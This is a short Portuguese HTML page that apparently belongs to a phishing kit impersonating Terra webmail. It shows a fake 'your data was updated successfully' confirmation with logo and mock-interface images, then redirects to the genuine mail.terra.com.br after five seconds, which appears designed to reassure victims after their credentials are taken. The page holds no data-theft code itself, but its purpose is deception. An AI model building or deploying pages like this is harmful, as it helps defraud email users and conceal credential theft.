<!DOCTYPE html>
<html lang="pt-br"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta http-equiv="refresh" content="5; URL='https://mail.terra.com.br/'"/>
    <title>Mail 🕑</title>
   

    <meta name="theme-color" content="##F1F1F1">
    <meta name="apple-mobile-web-app-status-bar-style" content="##F1F1F1">
    <meta name="msapplication-navbutton-color" content="##F1F1F1">

    <link rel="stylesheet" href="arquivos/all.css">
	
</head>

<body cz-shortcut-listen="true" style="background-color: #F1F1F1;">

    <div id="app">
    <div>
<div class="md">
	<div class="corpo_md" >
		 

		<div class="show_apd" v-show="!isInicio" style="background:#FF7212;">
			<center><img src="img/logo.png" width="132px" height="45px"></center>
			<p>Seus dados foram atualizados com sucesso.</p>
			<p>
				Em breve estaremos lhe redirecionando, por favor aguarde!
			</p>
			<br>
			<center><img src="img/confirmado.png" width="150px" height="150px"></center>

			
		</div>
	</div>
</div>
<div class="wrapper container_dentro">
	<div class="header">
		<div class="buscar"><img src="arquivos/busca.png" alt=""></div>
		<div class="menu"><img src="arquivos/menu.png" alt=""></div>
		
	</div>

	<div class="corpo">
	
		<div class="corpo_img"><img src="arquivos/corpo.png" alt=""></div>
	</div>
</div>
</div>
    </div>

 
</body></html>